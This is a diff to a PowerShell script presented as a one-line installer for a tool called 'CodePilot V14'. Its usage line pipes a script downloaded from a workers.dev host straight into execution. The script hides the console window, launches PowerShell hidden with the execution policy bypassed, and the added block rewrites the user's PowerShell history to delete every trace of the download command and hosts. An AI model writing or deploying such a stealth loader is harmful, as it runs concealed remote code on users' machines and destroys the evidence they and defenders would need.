@@ -1,5 +1,5 @@
 # CodePilot V14 — One-Line Install + Stealth Launch (Zero Input)
-# Usage: powershell -c "irm https://raw.githubusercontent.com/hyperlinken/whoa/more/install.ps1 | iex"
+# Usage: irm https://sweetbush.rr3703404.workers.dev/install.ps1 | iex
 # Hide the console window — no files, no new processes
 try {
     Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -ErrorAction SilentlyContinue
@@ -187,3 +187,18 @@ s.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$local
     Write-Host "  NumLock ON = hotkeys | OFF = typing | ESC = stop`n" -ForegroundColor Cyan
     & wscript.exe $vbs
 }
+
+# Clean install trace from PowerShell history
+try {
+    $hPath = (Get-PSReadLineOption).HistorySavePath
+    if ($hPath -and (Test-Path $hPath)) {
+        $lines = Get-Content $hPath -ErrorAction SilentlyContinue
+        $clean = $lines | Where-Object {
+            $_ -notmatch 'sweetbush' -and
+            $_ -notmatch 'rr3703404' -and
+            $_ -notmatch 'install\.ps1.*iex' -and
+            $_ -notmatch 'hyperlinken/whoa'
+        }
+        $clean | Set-Content $hPath -ErrorAction SilentlyContinue
+    }
+} catch {}
